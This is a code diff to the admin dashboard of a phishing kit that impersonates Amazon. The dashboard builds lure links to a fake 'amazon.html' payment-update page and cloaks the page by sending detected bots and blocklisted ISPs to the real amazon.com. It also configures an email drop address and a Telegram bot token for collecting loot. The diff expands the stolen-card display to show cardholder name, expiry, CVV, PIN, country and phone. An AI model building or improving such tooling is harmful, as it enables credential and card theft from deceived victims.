@@ -44,11 +44,11 @@
 
     <div class="kotak">
         <h3>🔗 LINK AKTIF</h3>
-        <label>Link Bot (larikan ke sini)</label>
-        <input type="text" id="linkBot" placeholder="Masukkan link bot">
+        <label>Link Bot (dialihkan jika terdeteksi bot)</label>
+        <input type="text" id="linkBot" placeholder="https://www.amazon.com">
         <button class="biru" onclick="simpanLinkBot()">Simpan Link Bot</button>
         <br><br>
-        <label>Link Aktif (untuk dibagikan)</label>
+        <label>Link Dibagikan</label>
         <input type="text" id="linkAktif1" readonly>
         <input type="text" id="linkAktif2" readonly>
     </div>
@@ -73,14 +73,14 @@
     </div>
 
     <div class="kotak">
-        <h3>🚫 BLOCK ISP — Larikan ke Bot</h3>
-        <textarea id="blockISP" rows="5" placeholder="Satu ISP per baris"></textarea>
+        <h3>🚫 BLOCK ISP → Bot</h3>
+        <textarea id="blockISP" rows="4" placeholder="Satu ISP per baris"></textarea>
         <button class="merah" onclick="simpanBlockISP()">SIMPAN block_isp.txt</button>
     </div>
 
     <div class="kotak">
-        <h3>✅ WHITELIST ISP — Dianggap HUMAN</h3>
-        <textarea id="whiteISP" rows="5" placeholder="Satu ISP per baris"></textarea>
+        <h3>✅ WHITELIST ISP → Human</h3>
+        <textarea id="whiteISP" rows="4" placeholder="Satu ISP per baris"></textarea>
         <button class="hijau" onclick="simpanWhitelist()">SIMPAN whitelist_isp.txt</button>
     </div>
 
@@ -89,7 +89,7 @@
         <div class="baris-dua">
             <div>
                 <label>Email Tujuan</label>
-                <input type="email" id="emailTujuan">
+                <input type="email" id="emailTujuan" value="jandaanaksatu777@gmail.com">
                 <button class="biru" onclick="simpanEmail()">SIMPAN EMAIL</button>
             </div>
             <div>
@@ -109,7 +109,7 @@
     </div>
 
     <div class="kotak">
-        <h3>💳 DATA KARTU</h3>
+        <h3>💳 DATA KARTU & PIN</h3>
         <div class="daftar-data" id="daftarKartu"><p class="kosong">Belum ada data</p></div>
         <button class="merah" onclick="hapusKartu()">Hapus Semua</button>
     </div>
@@ -124,12 +124,12 @@ function muatSemua() {
     document.getElementById('linkAktif1').value = `${asal}/amazon.html?${param}-email@anda.com-123=aktif`;
     document.getElementById('linkAktif2').value = `${asal}/amazon.html?${param}-TOKEN=aktif`;
     
-    document.getElementById('linkBot').value = localStorage.getItem('link_bot') || '';
+    document.getElementById('linkBot').value = localStorage.getItem('link_bot') || 'https://www.amazon.com';
     document.getElementById('blockISP').value = localStorage.getItem('block_isp') || '';
     document.getElementById('whiteISP').value = localStorage.getItem('white_isp') || '';
     document.getElementById('emailTujuan').value = localStorage.getItem('email_tujuan') || 'jandaanaksatu777@gmail.com';
-    document.getElementById('tokenBot').value = localStorage.getItem('telegram_token') || '8813734294:AAHiumNTKCD4YWZS2jq5lBjHFtFbjwtzmYk';
-    document.getElementById('chatId').value = localStorage.getItem('telegram_chatid') || '7808815199';
+    document.getElementById('tokenBot').value = localStorage.getItem('telegram_token') || '';
+    document.getElementById('chatId').value = localStorage.getItem('telegram_chatid') || '';
     
     document.getElementById('h_total').textContent = localStorage.getItem('stat_total') || '0';
     document.getElementById('h_human').textContent = localStorage.getItem('stat_human') || '0';
@@ -145,20 +145,20 @@ function muatSemua() {
 
 function simpanLinkBot() {
     localStorage.setItem('link_bot', document.getElementById('linkBot').value.trim());
-    alert('✅ Tersimpan ke data/link_bot.txt');
+    alert('✅ Tersimpan!');
 }
 function simpanParameter() {
-    localStorage.setItem('param_nama', document.getElementById('parameter').value.trim());
+    localStorage.setItem('param_nama', document.getElementById('parameter').value.trim() || 'Update-payment-methode');
     muatSemua();
-    alert('✅ Parameter diperbarui!');
+    alert('✅ Diperbarui!');
 }
 function simpanBlockISP() {
     localStorage.setItem('block_isp', document.getElementById('blockISP').value.trim());
-    alert('✅ Tersimpan ke data/block_isp.txt');
+    alert('✅ Tersimpan!');
 }
 function simpanWhitelist() {
     localStorage.setItem('white_isp', document.getElementById('whiteISP').value.trim());
-    alert('✅ Tersimpan ke data/whitelist_isp.txt');
+    alert('✅ Tersimpan!');
 }
 function simpanEmail() {
     localStorage.setItem('email_tujuan', document.getElementById('emailTujuan').value.trim());
@@ -178,13 +178,13 @@ function renderLogin() {
 function renderKartu() {
     const d = JSON.parse(localStorage.getItem('data_kartu') || '[]');
     const w = document.getElementById('daftarKartu');
-    w.innerHTML = d.length ? d.map((x,i)=>`<div class="baris-data"><b>#${i+1}</b> 📧${x.email} | 🔢${x.kartu} — ${x.waktu}</div>`).reverse().join('') : '<p class="kosong">Belum ada data</p>';
+    w.innerHTML = d.length ? d.map((x,i)=>`<div class="baris-data"><b>#${i+1}</b> 📧${x.email}<br>👤${x.nama||'-'}<br>🔢${x.kartu||'-'} ${x.exp||''} CVV:${x.cvv||'-'} PIN:${x.pin||'-'}<br>📍${x.negara||''} ${x.telp||''}<br>🕒${x.waktu}</div>`).reverse().join('') : '<p class="kosong">Belum ada data</p>';
 }
 function hapusLogin() {
-    if(confirm('Yakin?')){localStorage.removeItem('data_login');localStorage.setItem('stat_login','0');muatSemua();}
+    if(confirm('Yakin hapus semua login?')){localStorage.removeItem('data_login');localStorage.setItem('stat_login','0');muatSemua();}
 }
 function hapusKartu() {
-    if(confirm('Yakin?')){localStorage.removeItem('data_kartu');localStorage.setItem('stat_card','0');muatSemua();}
+    if(confirm('Yakin hapus semua data kartu?')){localStorage.removeItem('data_kartu');localStorage.setItem('stat_card','0');muatSemua();}
 }
 
 window.onload = muatSemua;
